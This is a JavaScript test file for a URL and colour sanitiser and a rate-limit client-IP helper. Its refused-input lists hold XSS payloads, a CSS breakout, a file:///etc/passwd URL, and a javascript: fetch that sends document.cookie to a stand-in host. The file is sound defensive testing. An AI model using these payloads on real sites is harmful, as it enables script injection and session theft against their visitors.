/**
 * Tests for url-safety.ts — the checks between tenant/visitor strings and
 * someone else's DOM (stored page_url, the widget's links, logo and colour)
 * and the client-address rule the chat rate limit keys on.
 *
 * Each "refused" case below is a real way the old code could be abused, not a
 * theoretical input: see the header of url-safety.ts.
 */
const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");

function loadEsbuild() {
  for (const c of [
    "esbuild",
    path.join(__dirname, "..", "..", "..", "app", "node_modules", "esbuild"),
    path.join(__dirname, "..", "..", "..", "node_modules", "esbuild"),
    "/tmp/node_modules/esbuild",
  ]) {
    try { const m = require(c); m.transformSync("const a = 1;", { loader: "ts" }); return m; } catch (_) { /* next */ }
  }
  console.log("SKIP " + path.basename(__filename) + " — no usable esbuild for this platform.");
  process.exit(0);
}
const es = loadEsbuild();
// Dependency-free module: transform, not bundle, and refuse any import so a
// future edit that adds one fails here instead of passing against a stub.
function loadTs(file) {
  const js = es.transformSync(fs.readFileSync(path.join(__dirname, file), "utf8"),
    { loader: "ts", format: "cjs" }).code;
  const m = { exports: {} };
  new Function("module", "exports", "require", js)(m, m.exports, (s) => { throw new Error("unexpected import " + s); });
  return m.exports;
}

const { safeHttpUrl, safePageUrl, safeHexColor, clientIp } = loadTs("url-safety.ts");

test("http(s) URLs pass through unchanged (trimmed)", () => {
  assert.strictEqual(safeHttpUrl("https://example.com/book"), "https://example.com/book");
  assert.strictEqual(safeHttpUrl("  http://example.com/a?b=c#d  "), "http://example.com/a?b=c#d");
  assert.strictEqual(safeHttpUrl("HTTPS://Example.com/"), "HTTPS://Example.com/");
});

test("script and non-web schemes are refused", () => {
  for (const bad of [
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    " javascript:alert(1)",
    "java\tscript:alert(1)",
    "\u0001javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "//evil.example/x",
    "/relative/path",
    "mailto:a@b.com",
  ]) {
    assert.strictEqual(safeHttpUrl(bad), null, JSON.stringify(bad));
  }
});

test("attribute-breaking characters are refused even after a valid scheme", () => {
  for (const bad of [
    'https://example.com/"onmouseover="alert(1)',
    "https://example.com/'x",
    "https://example.com/<script>",
    "https://exa mple.com/",
    "https://example.com/\nSet-Cookie:x",
    "https://example.com/`x`",
    "https://example.com\\@evil.com",
  ]) {
    assert.strictEqual(safeHttpUrl(bad), null, JSON.stringify(bad));
  }
});

test("non-strings, empties, hostless and over-long values are refused", () => {
  for (const bad of [null, undefined, 42, {}, [], "", "   ", "https://"]) {
    assert.strictEqual(safeHttpUrl(bad), null, JSON.stringify(bad));
  }
  const long = "https://example.com/" + "a".repeat(500);
  assert.strictEqual(safeHttpUrl(long), null);
  assert.strictEqual(safeHttpUrl(long, 1000), long, "the cap is a parameter");
  const edge = "https://example.com/" + "a".repeat(480);
  assert.strictEqual(edge.length, 500);
  assert.strictEqual(safeHttpUrl(edge), edge, "exactly 500 is allowed");
});

test("page_url mirrors the column's CHECK: null, 'whatsapp' or http(s)", () => {
  assert.strictEqual(safePageUrl("whatsapp"), "whatsapp");
  assert.strictEqual(safePageUrl("https://shop.example/p/1"), "https://shop.example/p/1");
  assert.strictEqual(safePageUrl("javascript:fetch('//x/'+document.cookie)"), null);
  assert.strictEqual(safePageUrl("WhatsApp"), null, "only the exact literal");
  assert.strictEqual(safePageUrl(undefined), null);
  assert.strictEqual(safePageUrl("https://a.example/" + "x".repeat(600)), null);
});

test("widget colour must be exactly #rrggbb", () => {
  assert.strictEqual(safeHexColor("#2f3a4a"), "#2f3a4a");
  assert.strictEqual(safeHexColor(" #ABCDEF "), "#ABCDEF");
  for (const bad of [
    "#abc", "2f3a4a", "#2f3a4a4a", "red", "rgb(0,0,0)",
    "#000000}body{display:none", "#00000g", "", null, 7,
  ]) {
    assert.strictEqual(safeHexColor(bad), null, JSON.stringify(bad));
  }
});

const headers = (o) => ({ get: (k) => (k.toLowerCase() in o ? o[k.toLowerCase()] : null) });

test("clientIp prefers headers the infrastructure overwrites", () => {
  assert.strictEqual(clientIp(headers({
    "cf-connecting-ip": "203.0.113.9", "x-real-ip": "10.0.0.1", "x-forwarded-for": "1.1.1.1, 2.2.2.2",
  })), "203.0.113.9");
  assert.strictEqual(clientIp(headers({ "x-real-ip": " 198.51.100.4 ", "x-forwarded-for": "1.1.1.1" })), "198.51.100.4");
});

test("clientIp never keys on the client-supplied FIRST forwarded hop", () => {
  // A script that rotates the first entry per request must land in one bucket.
  const a = clientIp(headers({ "x-forwarded-for": "6.6.6.1, 198.51.100.7" }));
  const b = clientIp(headers({ "x-forwarded-for": "6.6.6.2, 198.51.100.7" }));
  assert.strictEqual(a, "198.51.100.7");
  assert.strictEqual(a, b);
  assert.strictEqual(clientIp(headers({ "x-forwarded-for": "198.51.100.7" })), "198.51.100.7");
  assert.strictEqual(clientIp(headers({ "x-forwarded-for": "1.1.1.1, , " })), "1.1.1.1", "empty hops skipped");
});

test("clientIp falls back to one shared bucket, and caps length", () => {
  assert.strictEqual(clientIp(headers({})), "unknown");
  assert.strictEqual(clientIp(headers({ "cf-connecting-ip": "   " })), "unknown");
  assert.strictEqual(clientIp(headers({ "cf-connecting-ip": "x".repeat(200) })).length, 64);
});
